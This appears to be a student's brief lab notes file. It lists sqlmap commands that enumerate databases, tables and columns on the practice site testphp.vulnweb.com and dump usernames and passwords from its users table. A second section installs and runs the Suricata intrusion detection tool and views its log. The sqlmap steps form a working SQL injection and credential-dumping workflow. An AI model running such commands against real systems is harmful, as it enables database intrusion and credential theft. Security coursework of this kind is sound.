# 3-2lab


sql cammods


sqlmap –u testphp.vulnweb.com/artists.php?artist=1 --dbs

sqlmap –u testphp.vulnweb.com/artists.php?artist=1 –D acuart --tables

sqlmap –u testphp.vulnweb.com/artists.php?artist=1 –D acuart –T users –-columns

sqlmap –u testphp.vulnweb.com/artists.php?artist=1 –D acuart –T users –C uname --dump

sqlmap –u testphp.vulnweb.com/artists.php?artist=1 –D acuart –T users –C pass –dump

 week9
 
 suricata tool
 
 
 apt install suricata
 
 
 suricata -i eth0 -v
 
 
 ctrl + c
 
 
 cat /var/log/suricata/eve.json
